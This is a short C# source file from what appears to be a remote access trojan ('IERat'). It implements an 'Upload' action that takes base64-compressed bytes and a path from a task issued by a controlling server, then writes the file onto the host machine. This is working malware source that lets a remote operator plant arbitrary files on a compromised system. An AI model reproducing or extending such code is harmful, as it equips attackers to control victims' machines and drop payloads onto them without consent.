using System;
using System.IO;

namespace IERat.lib.Actions
{
    public class Upload
    {
        public static void Start(ref TaskObject NewAgentTask)
        {
            string Bytes2Save = NewAgentTask.args.Split(new string[] { ":::", }, StringSplitOptions.None)[0];
            string DestinationPath = NewAgentTask.args.Split(new string[] { ":::", }, StringSplitOptions.None)[1];
            var destinationFile = File.Create(DestinationPath);
            var fileBytes = Utils.Decompress(Convert.FromBase64String(Bytes2Save));
            destinationFile.Write(fileBytes, 0, fileBytes.Length);
            NewAgentTask.Result = "File uploaded successfully";
            NewAgentTask.args = ""; // so the file content won't be sent to the server
            destinationFile.Close();
        }
    }
}
